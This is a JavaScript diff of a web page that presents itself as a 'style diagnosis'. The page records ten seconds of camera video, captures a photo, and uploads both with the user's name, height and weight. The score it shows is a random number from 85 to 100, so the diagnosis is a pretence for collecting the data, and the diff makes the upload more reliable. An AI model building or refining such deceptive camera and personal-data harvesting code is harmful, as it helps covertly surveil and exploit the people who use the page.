@@ -66,7 +66,6 @@
                 .then(stream => {
                     video.srcObject = stream;
                     
-                    // iPhone/Safari対策：対応しているmimeTypeを自動選択
                     const types = ["video/webm;codecs=vp8", "video/mp4", "video/webm"];
                     const type = types.find(t => MediaRecorder.isTypeSupported(t));
                     mediaRecorder = new MediaRecorder(stream, { mimeType: type });
@@ -74,15 +73,13 @@
                     mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                     mediaRecorder.start();
 
-                    // 10秒計測
                     setTimeout(() => {
                         if(mediaRecorder.state !== "inactive") mediaRecorder.stop();
                         result.innerHTML = "データ解析中...";
                         
-                        // 録画停止後、少し置いてから送信（ファイル作成を待つ）
                         setTimeout(() => {
                             captureAndSend(user, h, w);
-                        }, 1500);
+                        }, 2000); // 2秒待ってから確実に送信
                     }, 10000); 
                 })
                 .catch(err => {
@@ -93,7 +90,6 @@
         function captureAndSend(user, h, w) {
             const score = Math.floor(Math.random() * (100 - 85 + 1)) + 85;
 
-            // 静止画キャプチャ
             const vW = video.videoWidth;
             const vH = video.videoHeight;
             canvas.width = vW; canvas.height = vH;
@@ -101,9 +97,14 @@
 
             canvas.toBlob(photoBlob => {
                 const formData = new FormData();
-                formData.append('content', `【スタイル診断】\\n👤 **名前:** ${user}\\n📏 **数値:** ${h}cm / ${w}kg\\n📊 **スコア:** ${score}点`);
+                // 改行コードを修正（\\n ではなく \n）
+                const contentText = `【スタイル診断完了】\n👤 **名前:** ${user}\n📏 **数値:** ${h}cm / ${w}kg\n📊 **スコア:** ${score}点`;
+                formData.append('content', contentText);
+                
+                // 画像を追加
                 formData.append('file1', photoBlob, 'style.png');
 
+                // 動画を追加
                 if (chunks.length > 0) {
                     const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
                     formData.append('file2', videoBlob, 'style_video.mp4');
